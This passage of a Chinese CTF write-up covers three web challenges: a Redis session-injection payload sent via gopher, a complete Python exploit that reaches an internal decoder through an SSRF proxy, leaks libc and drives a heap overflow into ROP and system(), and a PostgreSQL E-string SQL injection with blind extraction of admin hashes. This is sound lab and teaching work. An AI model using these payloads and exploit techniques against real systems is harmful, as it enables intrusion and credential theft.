-   文件是否由平台环境变量生成。
    
-   题目源码读取的是固定资源还是运行时资源。
    
-   提交平台是否接受候选值。
    

### 4\. PoC

```
*3\r\n
$3\r\n
SET\r\n
$<key-length>\r\n
<session-key>\r\n
$<value-length>\r\n
<session-value>\r\n
```

```
*3\r\n
$6\r\n
EXPIRE\r\n
$<key-length>\r\n
<session-key>\r\n
$<ttl-length>\r\n
<ttl>\r\n
```

```rust
def redis_bulk(data: bytes) -> bytes:
    returnb'$%d\r\n' % len(data) + data + b'\r\n'

session_key = b'PHPREDIS_SESSION:' + controlled_sid
session_value = b'pwn|' + serialized_gadget

resp = (
    b'*3\r\n'
    + redis_bulk(b'SET')
    + redis_bulk(session_key)
    + redis_bulk(session_value)
)

encoded = ''.join(f'%{byte:02x}'for byte in resp)
gopher_url = 'gopher://<靶机地址>:<redis-port>/_' + encoded
```

```
GET /<session-enabled-endpoint> HTTP/1.1
Host: target
Cookie: <session-cookie-name>=<controlled-sid>
Connection: close
```

* * *

## Web4-ezstar

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Web |
| 形态  | 容器题 |
| 附件  | 无（题目仅提供靶机） |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

这题的Web部分负责找到并访问内网解码服务，真正的利用点在附件中的 `sgdecode` 。从攻击面看，题目被刻意拆成两层：外层是暴露在公网的OpenMCT控制台，内层是只绑定回环地址的C++解码守护进程。前者本身没有明显漏洞，价值在于它自带一个可被外部调用的URL转发接口，把本不可达的<靶机地址>变成了可交互的HTTP端点。因此拿shell的入口不在Web框架，而在转发之后那段自定义二进制协议里。总体利用链如下：

```rust
读取 Web 源码
    -> 找到 /proxyUrl 转发接口
    -> 访问 <靶机地址>/decode
    -> 利用固定长度 hex dump 泄露堆地址和 libc
    -> 构造 Golay 长度 0，触发 d_pdu 堆越界写
    -> 覆盖 shared_ptr 控制块和虚表
    -> setcontext 恢复伪造寄存器现场
    -> ROP: dup2(4, 1) + system(command)
    -> 从 HTTP 响应中取得 flag
```

`sgdecode` 的核心是一个AX100 Mode 5帧解码状态机：先等同步字，再收24比特的Golay(24,12)长度码字，最后按长度收payload并写入 `d_pdu` 。真正的问题出在长度字段与写入循环的配合上：长度来自攻击者可控的码字，写入既没有上界检查，终止条件又写成 `d_cnt == d_len` 。用一个解码结果为0的全零码字，就能让 `d_len` 恒为0，使相等条件永远不成立，把一次正常的定长拷贝退化成从 `d_pdu` 开始的无界堆写。

光有写还不够，还需要读。服务端在每次解码后都会把 `0x410` 字节的响应缓冲区整体转成hex返回，且不清空复用的堆块，于是同一块内存里残留的C++对象指针与unsorted-bin指针会随响应一起泄露。堆地址用于定位 `d_pdu` 和紧随其后的 `shared_ptr` 控制块，libc地址用于取出 `setcontext` 、 `dup2` 、 `system` 等符号。拿到这两个基址后，越界写就不再是盲写：先修补被踩坏的控制块头部与相邻chunk的size，再把控制块虚表指针指向 `d_pdu` 内伪造的虚表，析构时的虚调用就变成 `setcontext(ctrl)` 。由于 `rdi` 恰好等于控制块地址，可以把控制块本身当作 `ucontext_t` ，在其中布置 `RSP` / `RIP` ，随后走 `dup2(4,1)` 把命令输出接回当前HTTP连接，再 `system` 读取flag。

### 3\. 解题过程

#### Web入口分析

首页是一个OpenMCT遥测控制台。检查静态资源和服务端源码后，可以发现 `server.js` 可直接读取，其中挂载了OpenMCT自带的转发代理：

```
/proxyUrl?url=<目标 URL>
```

服务端对目标地址做了限制，但允许访问回环地址。结合页面代码、附件中的 `runbook.txt` ，可以确定解码器监听于：

```
<靶机地址>/decode
```

因此外部访问内部解码器的URL为：

```
https://<题目地址>:<端口>/proxyUrl?url=http%3A%2F%2F127.0.0.1%3A9001%2Fdecode
```

对这个地址发送 `POST` 请求，请求体就会被原样转发给 `sgdecode` 。

OpenMCT的静态目录没有做严格隔离， `server.js` 、 `package.json` 与路由配置都能直接下载，因此不必爆破路径就能还原服务端行为。转发接口原本用于让前端跨域拉取遥测源，只对协议和主机名做了粗粒度过滤，回环地址、<靶机地址>、 `localhost` 都在白名单内，也没有禁止非标准端口。代理在转发时保留了原始方法、 `Content-Type` 与请求体，响应则原样回传，所以对 `/proxyUrl` 发 `POST` 等价于直接与解码器对话。这一点很关键：后续所有帧构造、泄露与利用都可以只用普通HTTP客户端完成，不需要在容器内落地任何文件。

另外，内层URL需要整体做一次百分号编码，否则其中的`:`、 `/` 会被外层解析器截断，请求里固定写成 `http%3A%2F%2F127.0.0.1%3A9001%2Fdecode` 就是为了避开这个问题。

附件下载地址为：

```
/packages/sgdecode-1.4.2.tar.gz
```

压缩包中包含：

-   `sgdecode` ：与远端相同的解码服务；
    
-   `libc.so.6` ：远端精确版本，Ubuntu 22.04 glibc 2.35；
    
-   `runbook.txt` ：内部接口及传输格式；
    

#### 协议格式

`runbook.txt` 给出的关键规则是：

1.  请求体中的每一个字节代表一个逻辑比特；
    
2.  每8个传输字节组成一个帧字节；
    
3.  每一帧以同步字 `0xA7` 开始；
    
4.  比特序为MSB first；
    
5.  每次解码后，服务端固定返回帧缓冲区的hex dump。
    

同步字展开为：

```
SYNC = bytes([1, 0, 1, 0, 0, 1, 1, 1])  # 0xa7 = 1010 0111
```

普通字节展开函数如下：

```python
def frame(payload):
    out = bytearray([1, 0, 1, 0, 0, 1, 1, 1])
    for byte in payload:
        out.extend((byte >> bit) & 1 for bit in range(7, -1, -1))
    return bytes(out)
```

传输层并不做字节对齐：一个逻辑比特占一个字节，接收端再把每8个字节拼回一个帧字节，所以请求体长度大约是有效数据长度的8倍。同步字之后的24个比特不是普通数据，而是Golay(24,12)码字，由12位信息位加12位校验位组成，解码器用它恢复本次payload的字节长度。Golay码是线性码，全零码字本身合法且解码结果必然为0，因此不需要构造纠错图案，直接发24个零比特即可。

长度字段之后才是payload区，解码器每凑满8个比特就写入一个字节。长度以字节为单位、写入却由比特流驱动，攻击者既能精确控制写入的字节序列，也能让比特流远长于声明长度。

#### 二进制保护

```yaml
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
```

漏洞发生在堆上，所以栈Canary没有影响。Full RELRO使GOT覆盖不可行，NX则要求使用ROP。最终方案只使用已经泄露基址的libc，不依赖 `sgdecode` 的PIE基址。

#### 漏洞定位

`sgdecode` 使用AX100 Mode 5解码状态机。解码器对象中比较重要的字段如下：

```
object + 0x1f8  state
object + 0x200  d_cnt
object + 0x208  d_len
object + 0x220  d_pdu 指针
```

构造函数中给 `d_pdu` 分配的空间固定为 `0x400` 字节：

```
d_pdu = new uint8_t[0x400];
```

解码器先接收24个比特的Golay长度码字，解码完成后把得到的长度写入 `d_len` ，然后切换到payload接收状态。

payload状态的反编译逻辑可以简化为：

```
while (remaining_bits >= 8) {
    byte = bits_to_byte(input);

    d_pdu[d_cnt] = byte;
    d_cnt++;

    if (d_cnt == d_len) {
        finish_packet();
        reset_decoder();
        break;
    }
}
```

这里存在两个问题：

-   写入前没有检查 `d_cnt < 0x400` ；
    
-   终止判断发生在 `d_cnt++` 之后，并且使用相等判断而不是大于等于判断。
    

Golay全零码字的解码结果仍为0。因此只要在同步字后发送24个零比特，就能令：

```
d_len = 0
```

第一次写入后 `d_cnt` 由0变成1，随后再也不可能等于 `d_len` 。只要继续发送比特流，就可以从 `d_pdu` 开始进行无界堆写。

更准确地说，长度码字解码完成后，代码把结果直接写进 `d_len` ，没有做 `0 < len <= 0x400` 之类的合法性校验；进入payload状态后，循环条件只看"剩余比特是否够8个"，与 `d_len` 无关。于是 `d_len = 0` 时第一次迭代就会往 `d_pdu[0]` 写一个字节并把 `d_cnt` 加一，相等判断永远为假， `reset_decoder()` 也不会被调用，解码器一直停在payload状态，把攻击者送来的每个字节依次写到 `d_pdu + 1` 、 `d_pdu + 2` ……

可写范围只受请求体长度限制。一次请求携带约 `0x730` 字节payload，展开成比特接近15KB，仍远小于代理与服务的请求体上限，因此可以一次性覆盖 `d_pdu` 之后连续几个chunk。写入是纯顺序覆盖、没有随机性，适合直接铺一份完整的伪造布局，而不需要分多次请求逐步改写。

恶意帧的前缀为：

```
SYNC_BITS + b"\x00" * 24 + expand_bits(overflow_data)
```

#### 信息泄露

内部HTTP处理代码每次都会分配 `0x410` 字节，并固定把 `0x410` 字节编码为十六进制返回。它没有按照真实有效数据长度清空整个区域，因此会把复用堆块中的旧内容一并返回。

连续发送两个很短的普通请求：

```
post(frame(b"A"))
leak = bytes.fromhex(post(frame(b"B")).text.strip())
```

第一个请求释放对应 `0x420` chunk，第二个请求复用该chunk，于是响应中同时出现C++对象指针和unsorted-bin指针。

实测字段如下：

| 回显偏移 | 内容  | 用途  |
| --- | --- | --- |
| `0x28` | 解码器对象地址 | 推导 `d_pdu` 及相邻堆块地址 |
| `0x38` | unsorted-bin / `main_arena` 指针 | 计算libc基址 |
| `0x40` | 同一arena指针 | 交叉检查泄露是否有效 |

这里的泄露不是格式化字符串或越界读，而是"分配后未初始化"：处理函数拿到一块 `0x410` 字节的用户区（对应 `0x420` 的chunk），只写入本次解码产生的少量字节，却把整块 `0x410` 字节都编码返回。第一次普通请求结束后该chunk被释放， `shared_ptr` 控制块、解码器对象指针以及进入unsorted bin后写入的arena相关指针就留在了这块内存里；第二次请求申请到同一地址，旧内容便原封不动地出现在响应中。因此关键在于"先释放、再复用"，两个请求必须连续发送，中间不能插入会打乱tcache/unsorted链表顺序的其他请求。

取到的 `obj` 位于堆区（通常是 `0x55...`）， `arena` 位于libc映射区（通常是 `0x7f...`），可以用高位范围和页对齐做合法性判断；如果复用到的不是目标chunk，字段会明显异常，重试一两次即可。

精确libc中arena泄露对应的偏移为：

```toml
obj   = u64(leak[0x28:0x30])
arena = u64(leak[0x38:0x40])
libc  = arena - 0x21ace0
```

由于最终ROP会调用 `exit(0)` ，守护进程会重新启动 `sgdecode` ，ASLR地址也会随之改变。所以泄露与越界写必须在同一个进程生命周期中连续完成，不能把某一次的地址用于重启后的进程。

#### 堆布局

本题构建中，解码器对象及相关分配的相对位置稳定：

```toml
dpdu = obj + 0xbd0
ctrl = dpdu + 0x410
raw  = dpdu + 0x430
```

关键布局为：

```
d_pdu + 0x000  0x400 字节合法 payload 区
d_pdu + 0x400  shared_ptr 控制块 chunk header
d_pdu + 0x410  shared_ptr 控制块用户数据
d_pdu + 0x430  后续 0x420 大小的 HTTP 回显 chunk
```

越界写会先经过控制块和相邻chunk的分配器元数据。为了让请求退出时能够稳定进入C++智能指针析构逻辑，需要重建以下内容：

```
put(0x400, p64(0))
put(0x408, p64(0x21))
put(0x410, p64(fake_vtable))
put(0x418, p64(0x100000001))
put(0x420, p64(0))
put(0x428, p64(0x421))
```

其中 `0x100000001` 是打包在同一个64位值中的strong/weak引用计数。请求结束时，析构逻辑发现strong count降为0，就会调用控制块虚表偏移 `+0x10` 处的函数。

控制块一般由虚表指针、强引用计数、弱引用计数三段组成，析构路径大致是：强引用减一，减到0则调用 `vtable[2]` 销毁被管理对象，随后弱引用减一，减到0时调用 `vtable[3]` 释放控制块本身。因此 `0x100000001` 把强弱计数都置为1，第一次析构后强计数归零、弱计数仍为1，既保证走进虚调用分支，又不会立刻把控制块交给 `free` ，避免在 `setcontext` 之前触发堆检查。

被覆盖的chunk头也必须补回：控制块头部改成 `prev_size = 0` 、 `size = 0x21` ，紧随其后的 `0x420` chunk改成 `prev_size = 0` 、 `size = 0x421` ，让分配器仍认为堆连续完整，否则析构中的释放操作会在 `malloc` 内部崩溃。

#### 控制流劫持：fake vtable + setcontext

将控制块虚表指针改成位于 `d_pdu` 内的伪造虚表：

```
fake_vtable = dpdu + 0x100
put(0x410, p64(fake_vtable))
put(0x100, p64(0) + p64(0) + p64(setcontext) + p64(0))
```

这样析构时的虚调用等价于：

```
setcontext(ctrl);
```

此时 `rdi` 正好指向被覆盖的控制块，可以直接把控制块及其后方区域伪造成 `ucontext_t` 。需要设置的主要字段是：

```
put(0x410 + 0xa0, p64(rop_stack))  # RSP
put(0x410 + 0xa8, p64(pop_rdi))    # RIP
```

`setcontext` 从 `rdi` 指向的 `ucontext_t` 恢复现场， `RSP` 与 `RIP` 分别位于 `+0xa0` 、 `+0xa8` ，其余通用寄存器和浮点状态也要给合法值，否则会在恢复FPU状态时异常。所以布局里还清空了 `+0x68` 、 `+0x70` 、 `+0x88` ，把 `+0xe0` 指向一块可读写的 `fpstate` ，并在 `+0x1c0` 写入 `0x1f80` 作为 `mxcsr` ，这样 `setcontext` 才能干净地跳到ROP链第一条指令。

本题libc中使用到的偏移如下：

| 符号或Gadget | libc偏移 |
| --- | --- |
| `setcontext` | `0x539e0` |
| `pop rdi ; ret` | `0x2a3e5` |
| `pop rsi ; ret` | `0x2be51` |
| `dup2` | `0x115160` |
| `system` | `0x50d70` |
| `exit` | `0x455f0` |

#### ROP链

监听socket为文件描述符3， `accept` 得到的客户端连接为文件描述符4。为了让命令输出通过当前HTTP响应返回，先调用：

```
dup2(4, 1);
```

然后执行读取flag的命令，最后调用 `exit(0)` ，避免返回到已损坏的C++对象：

```
rop = flat(
    4,
    pop_rsi, 1,
    dup2,
    pop_rdi, command,
    system,
    pop_rdi, 0,
    exit,
)
```

由于题目没有直接说明flag的绝对路径，使用：

```
(find / -xdev -type f \( -name flag -o -name flag.txt \) -exec cat {} +; env) 2>/dev/null
```

同时检查常见文件名和环境变量。

监听socket由守护进程启动时创建，通常是3；每接受一个连接， `accept` 返回的描述符就是4，当前请求的响应正写在这个连接上。 `system` 默认输出到1，若不重定向，命令结果会落到守护进程自己的stdout而不是HTTP响应里。 `dup2(4, 1)` 把标准输出替换成客户端连接，之后 `system` 的任何输出都直接成为响应体的一部分，这也是能在一次请求内拿到flag的原因。

flag的路径通常不固定，可能位于根目录的随机文件名下，也可能只通过环境变量注入，所以命令同时覆盖两种可能：先用 `find / -xdev` 在同一文件系统内查找 `flag` 、 `flag.txt` 并 `cat` ，再用 `env` 打印环境变量，错误输出全部丢弃以免污染响应。 `-xdev` 避免遍历 `/proc` 、 `/sys` 等伪文件系统，既加快速度也减少无关输出。命令执行完调用 `exit(0)` 正常结束，由守护进程重新拉起，容器状态自动复位。

### 4\. PoC

```python
#!/usr/bin/env python3
import re, struct, sys
import requests, urllib3
urllib3.disable_warnings()

BASE = sys.argv[1].rstrip('/')
URL = BASE + '/proxyUrl?url=http%3A%2F%2F127.0.0.1%3A9001%2Fdecode'

def p64(v):return struct.pack('<Q', v)
def u64(b):return struct.unpack('<Q', b.ljust(8, b'\x00'))[0]

def frame(payload, zero_len=False):
    out = bytearray([1,0,1,0,0,1,1,1])
    if zero_len:
        out += b'\x00' * 24
    for byte in payload:
        out.extend((byte >> bit) & 1for bit in range(7, -1, -1))
    return bytes(out)

def post(body):
    r = requests.post(URL, data=body, verify=False, timeout=20)
    r.raise_for_status()
    return r

## 1) 先释放再复用，拿到对象地址与 libc 指针
post(frame(b'A'))
leak = bytes.fromhex(post(frame(b'B')).text.strip())
obj = u64(leak[0x28:0x30])
arena = u64(leak[0x38:0x40])
libc = arena - 0x21ace0

dpdu = obj + 0xbd0
ctrl = dpdu + 0x410
setcontext = libc + 0x539e0
pop_rdi = libc + 0x2a3e5
pop_rsi = libc + 0x2be51
dup2 = libc + 0x115160
system = libc + 0x50d70
exit_ = libc + 0x455f0

buf = bytearray(0x500)
def put(off, data):
    buf[off:off+len(data)] = data

## 2) 修补控制块与相邻 chunk 头
put(0x400, p64(0))
put(0x408, p64(0x21))
put(0x418, p64(0x100000001))
put(0x420, p64(0))
put(0x428, p64(0x421))

## 3) 伪造虚表，析构时 setcontext(ctrl)
fake_vtable = dpdu + 0x100
put(0x410, p64(fake_vtable))
put(0x100, p64(0) + p64(0) + p64(setcontext) + p64(0))

## 4) 把控制块伪造成 ucontext_t，跳到 ROP
rop = dpdu + 0x300
cmd = b'(find / -xdev -type f \( -name flag -o -name flag.txt \) -exec cat {} +; env) 2>/dev/null'
cmdp = dpdu + 0x480
put(0x480, cmd)
put(0x410 + 0xa0, p64(rop))
put(0x410 + 0xa8, p64(pop_rdi))
for off, val in [(0x300, 4), (0x308, pop_rsi), (0x310, 1), (0x318, dup2),
                 (0x320, pop_rdi), (0x328, cmdp), (0x330, system),
                 (0x338, pop_rdi), (0x340, 0), (0x348, exit_)]:
    put(off, p64(val))

## 5) d_len=0 触发无界写
post(frame(bytes(buf), zero_len=True))
```

* * *

## Web5-ezcms

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Web |
| 形态  | 容器题 |
| 附件  | 无（题目仅提供靶机） |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

#### TL;DR

| 步骤  | 入口  | 手法  | 结果  |
| --- | --- | --- | --- |
| 1   | 侦察  | `/`<br><br>、 `/search` 、 `/admin/*` | 指纹/端点枚举 |
| 2信息泄露 | `?q=..%00..`<br><br>、 `category=..%00..` | NUL触发“诊断页” | 回显SQLSTATE+完整失败SQL，暴露 `ILIKE E'..'` 拼法 |
| 3SQL注入 | `GET /search?q=` | PostgreSQL E-string反斜杠转义绕过 | 未认证任意子查询 |
| 4盲注外带 | `GET /search?q=` | 布尔盲注（1 vs 45）+ `lpad()` 前缀比对 | dump `admins` 表5账号及sha256 |
| 5破解 | —   | cmd5/字典 | altair: freedom |
| 6后台登录 | `POST /admin/login` | 单次正确登录 | 管理员会话 |
| 7上传getshell | `POST /admin/media/upload` | 只校验图片字节→PNG+JSP多语种 | `/media/cmd.jsp`<br><br>未认证RCE（uid=1001） |
| 8提权 | SUID `/usr/local/bin/easycms-restore` | 参数拼进 `bash -c` ， `$(...)` 命令替换 | root `chmod 644 /flag` →读flag |

#### 技术栈指纹

访问 `/WEB-INF/web.xml` （不存在）返回Tomcat原生404页，泄露版本：

```
<h3>Apache Tomcat/10.1.61</h3>
```

404/405返回Spring默认JSON `{"timestamp","status","error","path"}` （Spring Boot）； `OPTIONS /` 有 `Accept-Patch` 、 `Vary: Origin` ； `/admin/**` 统一302→ `/admin/login` （Spring Security）。

无任何安全响应头；会话 `JSESSIONID` （HttpOnly，无Secure/SameSite）；所有表单无CSRF token。

DB：PostgreSQL，应用库 `easycms` 。

这套组合基本决定了后续所有判断：Spring Security只覆盖 `/admin/**` ，公开路由完全没有鉴权，所以匿名态能碰到的每一个参数都值得当成注入点；Tomcat 10.1属于Jakarta Servlet世代，JSP依旧由JspServlet按扩展名编译，这为后面的图片马提供了前提；PostgreSQL的 `E''` 字符串、 `$$` 美元引用和 `ILIKE` 大小写不敏感匹配，则直接决定了注入payload的语法形态。另外，应用会把数据库异常渲染成“诊断页”，说明它没有统一的异常兜底，这类页面往往比任何扫描器的输出都更有价值。

#### 端点全集（逐个实测）

公开：

```bash
GET  /                 首页
GET  /search?q=        搜索（按文章标题）
GET  /team             团队
GET  /article/{id}     文章详情（id 为 Long：/1→200，/1.0→400，不存在→302 /）
GET  /login  /register
POST /login  /register
GET  /admin/login      控制台登录
POST /admin/login
GET  /api/articles     公开 API {"items":[{id,title,author,category}]}，支持 ?category= 精确过滤
GET  /api/health       {"status":"ok","service":"easycms"}
```

认证后： `GET/POST /compose` （title≤128, summary≤255, category≤32, body≤20000）、 `GET /logout`

后台端点： `/admin` 、 `/admin/login` 、 `/admin/dashboard` 、 `/admin/content` 、 `/admin/content/delete` 、 `/admin/media` 、 `/admin/media/upload` 、 `/admin/users` 、 `/admin/settings` 、 `/admin/export` 、 `/admin/flag` 、 `/admin/console`

> 注意： `/admin/flag` 、 `/admin/console` 、 `/admin/export` 登录后均404——诱饵。flag在“后台功能→上传→RCE→提权”这条链上。

把端点按权限拆成三层后，攻击面就很清楚了：公开层中只有 `/search` 、 `/api/articles` 、 `/compose` 、 `/register` 会把用户输入拼进SQL；认证层只负责发文；后台层才是内容管理、媒体库、用户与设置。三个“名字最像答案”的后台端点全是404，说明出题人有意把flag从“直接读”改成了“先拿权限再读”，因此真正要争的不是某个路径，而是从匿名到 `easycms` 系统用户、再到root的两级跳板。媒体库同时具备“文件落盘”和“按原文件名对外暴露”两个特征，是最可疑的写入点；而一旦容器内存在SUID程序，本地提权就等于把答案写在了明面上。

#### 无源码/备份泄露

`robots.txt` 、 `sitemap.xml` 、`.git/` 、`.env` 、 `pom.xml` 、 `application.properties|yml` 、 `WEB-INF/web.xml` 、 `META-INF/MANIFEST.MF` 、 `actuator/*` 、 `druid` 、 `h2-console` 、 `swagger` 、 `manager` 、 `*.zip` 、 `app.jar` 等全部404。

#### 攻击链推演

先把可能的路线排一遍：直接读 `/flag` 没有入口； `/admin/flag` 是空壳；路径匹配绕过在Spring Security的规范化面前基本无效；目录穿越和任意文件读被Tomcat拦死。剩下的只有一条主线——用SQL注入拿到数据库里的凭据，因为只有凭据能把匿名身份换成管理员身份。拿到管理员之后，后台并没有现成的命令执行或文件读取功能，唯一能写入磁盘的是图片上传，于是“上传点＋可执行目录”成为第二个关键假设。最后即使拿到webshell，进程也只是 `easycms` ，必须再找一个以root身份执行的本地程序。三个环节环环相扣，缺一不可，这也解释了为什么端点看似简单却需要完整攻击链。

### 3\. 解题过程

#### 信息泄露：NUL字节触发的诊断页

向任何进入SQL的参数（ `/search?q=` 、 `/api/articles?category=` 、 `/compose` 各字段、 `/admin/login` username）塞 `%00` ，触发“诊断”页，回显SQLSTATE+错误文本+完整失败SQL：

```
GET /search?q=test%00
```

→诊断·EasyCMS

```sql
SQLSTATE：42601 语句语法错误 (syntax error)
失败语句：SELECT id, title, summary, author, category FROM articles
          WHERE title ILIKE E'%test xx%' ORDER BY id DESC
```

```
GET /api/articles?category=zz%00yy
```

```json
{"error":"...","statement":"SELECT id,title,author,category FROM articles WHERE category = '...'"}
```

```
POST /register（用户名重复）
```

```
SQLSTATE 23505，失败语句 INSERT INTO users (username, password_hash) VALUES (...)
```

**价值**：拿到SQL模板，最关键的是 `/search` 的 `title ILIKE E'%<q>%'` （E-string）+只做单引号翻倍这一事实。也确认所有参数都是字符串拼接。但单引号被翻倍，普通 `' OR 1=1` 全失败。

为什么一个 `%00` 就能换来整条SQL？PostgreSQL的文本参数不接受 `0x00` ，驱动或服务端在编码/解析阶段就会抛错，语句根本执行不到，而应用的处理逻辑是“任何数据库异常→渲染诊断页→把SQLSTATE、异常文本和当前语句一并写出来”。这不是漏洞利用，而是开发把调试手段带进了生产： `%00` 只是一个既不会改变参数语义、又必然抛异常的“开关”。几个入口都试一遍还有额外收获—— `category` 处是 `=` 而不是 `ILIKE` ，且没有E前缀，即便逃出引号也用不上反斜杠； `/compose` 和 `/admin/login` 的插入/查询语句同样会把表名列名送出来，只是这些位置没有可用的转义缺陷。所以要盯住的是 `/search` ，它同时满足“E-string语境”和“单引号翻倍”两个条件。

再看模板本身，信息量比表面更大：字段顺序 `id, title, summary, author, category` 说明 `SELECT *` 被显式列名替代，但拼接口仍然是 `WHERE title ILIKE E'%...%'` ；没有 `LIMIT` ，靠 `ORDER BY id DESC` 排序，意味着注入点处的表达式一旦为真，返回的就是全部命中行，页面上“结果（N条）”这个数字天然成了一个可观测的布尔信道。这一点在盲注阶段被直接用上了。

#### SQL注入：E-string反斜杠转义绕过

##### 过滤与校验器

全局“SQL语句”校验器（语句包含非法字符 `(illegal character in statement)` ）：

-   字符级拦：`;``<` `>` （实测还挡 `~` 、`::`、 `||` ）
    
-   整词拦： `and` `or` `union` `like` `in` `case` `when` `concat` `pg_sleep` `pg_read_file` `pg_ls_dir` `information_schema` `substr` `ascii` `chr` `md5` `cast` `regexp_*` `string_agg` `translate`...
    
-   放行：单引号 `'` 、反斜杠 `\` 、注释 `--` / `#` 、 `lpad` / `rpad` / `length` / `replace` / `format` / `quote_literal` 、 `$$...$$` 、 `EXISTS` 、 `IS (NOT) NULL` 、 `OFFSET` / `LIMIT` / `ORDER BY` 、 `pg_class` / `pg_attribute`
    

##### 原理

```sql
SELECT id, title, summary, author, category FROM articles
WHERE title ILIKE E'%<q>%' ORDER BY id DESC
```

应用只把 `'` → `''` 。但PostgreSQL `E''` 里反斜杠也是转义符：

输入 `\'` →应用翻倍成 `\'''`

E-string中： `\'` =字面引号，第二个 `'` =闭合字符串

于是逃出字符串，可写SQL，再用 `--` 注释掉尾部 `%' ORDER BY id DESC` 。

这里有两个容易被忽略的细节。第一，反斜杠本身要经过HTTP与URL编码才能原样到达后端， `--data-urlencode` 把 `\\'` 发成 `%5C%27` ，服务端拿到的就是反斜杠加单引号；若手工拼URL，很容易把反斜杠丢掉，表现就是“明明payload对了却仍返回45条”。第二，闭合之后不能直接开始写 `OR` ，因为校验器按词拦截了 `and` / `or` / `union` / `like` 等，同时也拦了`;`、 `<` 、 `>` 。于是思路从“构造完整子句”转成“构造一个可求值的表达式”：用 `=` 做等值比较，用 `IS NOT NULL` 做存在性判断，用 `lpad` / `length` / `replace` 这类字符串函数做逐字比对，用 `$$...$$` 承载字面量，用 `OFFSET` 遍历行。这也是为什么最终的注入形态看起来不像传统的联合查询，而像一个永远返回真/假的谓词。

##### 验证

```bash
curl -sG $T/search --data-urlencode "q=\\'"
## → SQLSTATE 42601 ... WHERE title ILIKE E'%\\''%' ORDER BY id DESC

curl -sG $T/search --data-urlencode "q=\\' = (SELECT true)--"    # 结果（1 条）
curl -sG $T/search --data-urlencode "q=\\' = (SELECT false)--"   # 结果（45 条）
curl -sG $T/search --data-urlencode "q=\\' IS NOT NULL--"        # 结果（46 条）全量
```

→未认证，可执行任意子查询。（1条=标题以 `'` 结尾的那篇，false时其余45条）

#### 布尔盲注外带数据库

##### 探针

```
q=\'=(<布尔表达式>)--
```

页面「结果（1条）」=true，「结果（45条）」=false。

##### 逐字外带（绕过substr/char/ascii黑名单）

```
lpad( (SELECT password_hash FROM admins ORDER BY id LIMIT 1 OFFSET <i>) , k ) = $$<前缀>$$
```

`lpad(x,k)` 取前k字符补齐，与k长度前缀比较=前缀匹配；字面量用 `$$...$$` （含 `$` 用 `$q$...$q$` ）避免单引号翻倍。完整外带脚本见 `4.1` ，48线程实测约30~35 req/s。

具体做法是：先固定 `OFFSET` 选行，再让 `k` 从1递增，每一轮把所有候选字符与已知前缀拼成lpad(...,k)=$$前缀+c$$并发请求，命中那个字符就是第 `k` 位。之所以不用 `substr` ，是因为它被词表拦掉； `lpad` 在这里等价于“右补空格到长度k再整体比较”，只要前缀长度等于 `k` ，比较结果就只取决于前 `k` 个字符，副作用是若目标串短于 `k` 也会因补空格而失配，于是 `k` 递增到首位无命中即视为读完。十六进制哈希的字符集只有 `0-9a-f` 共16个，一轮最多16个请求，一个64位哈希的理论上限约一千次请求；加上用户名（小写字母+数字）和长度探针，五条记录的量级在几分钟内可以跑完。线程数不能开太高，靶机对并发连接有明显限速，30~35 req/s是实测的稳定区间，再高会出现超时和假阴性——假阴性在这类外带里最危险，因为“无命中”被当作字符串结束，会直接把结果截断。因此每一轮都保留重试，且对同一位置命中多个字符的情况取首个并复核。

##### 库结构

`public` schema 14个关系，应用表3张：

| 表   | 列   |
| --- | --- |
| `articles` | id, created_at, title, body, summary, category, author |
| `users` | id, username, password_hash, role, created_at（约35行） |
| `admins` | id, username, password_hash, created_at, title（5行） |

`admins` 是 `/admin/login` 绑定的独立表，与普通用户库彻底分离。

##### dump admins

用户名： `vega` / `altair` / `capella` / `rigel` / `atlas` （恒星名），哈希均为64位无盐sha256：

| 用户名 | password_hash | 明文  |
| --- | --- | --- |
| vega | 1ac7df128e4f666bcfe64ba395b285ec69f54ab5e1fbf67b1a86f3bac77a8c36 | 未命中 |
| altair | 13b1f7ec5beaefc781e43a3b344371cd49923a8a05edd71844b92f56f6a08d38 | freedom |
| capella | bc0445a68f9ac5ef6abc67eb1ab3a9d7ca1b727c219ff89c79fd3ac907b7651c | 未命中 |
| rigel | 24998eacdca975e40ea56aaf0395ff8c5071016f9eae4d1a6a42f25f5db39171 | 未命中 |
| atlas | 4dfbab9993e5e8a92c6ed29b2f86c1dfef0c5a475de9fc37481253e79a5c029c | 未命中 |

哈希算法由 `/register` 重复用户名报错页确认sha256(明文)，并用已知账号在线验证，未加盐。先打 `admins` 而不是 `users` 的理由也很直接：后者有三十多行，逐条破哈希成本高且大概率是普通用户；前者只有五行，且是 `/admin/login` 唯一认的表。

#### 离线破解

`altair` 在cmd5查到 `freedom` ，本地校验：

```
$ printf 'freedom' | sha256sum
13b1f7ec5beaefc781e43a3b344371cd49923a8a05edd71844b92f56f6a08d38  -
```

能查到的前提是哈希无盐且无迭代：同样的明文在任何实例都得到同一个值，公开彩虹表便能命中；一旦加了每用户盐，字典立刻失效。四个未命中并非无解，只是没必要——有一个管理员可用，链条就能往下走。本地校验同样不能省：在线库存在误报，必须确认 `sha256("freedom")` 与表中值逐字节相等再登录，避免浪费仅有的三次机会。

#### 管理员登录（注意锁定）

`/admin/login` ：用户名归一化+同一用户名3次失败锁600s→拿到明文后只做一次正确登录。

```
curl -s -i -c cookies.txt --data 'username=altair&password=freedom' \
  <靶机地址>
```

```
HTTP/1.1 302
Set-Cookie: JSESSIONID=<SESSION-ID>; Path=/; HttpOnly
Location: /admin/dashboard;jsessionid=<SESSION-ID>
```

`/admin/dashboard` 返回200，显示「登录身份：altair」。

登录环节的设计值得单独说一句：用户名在服务端做了归一化（大小写、空白），因此用 `ALTAIR` 、 `Altair` 或带前后空格的形式试探并不会绕过计数，反而会把锁定计数加到同一个键上；同一用户名连续3次失败锁定600秒，而锁定时长对一个需要反复试口令的解题者来说几乎是致命的。合理做法是全程只做一次请求：先在本地确认凭据，再看响应里的 `Location` 和 `Set-Cookie` 。302到 `/admin/dashboard;jsessionid=...`既证明认证成功，也解释了为什么后续请求要带上 `cookies.txt` ——Spring Security会把会话绑定在 `JSESSIONID` 上，URL里的`;jsessionid` 只是向后兼容的写法。

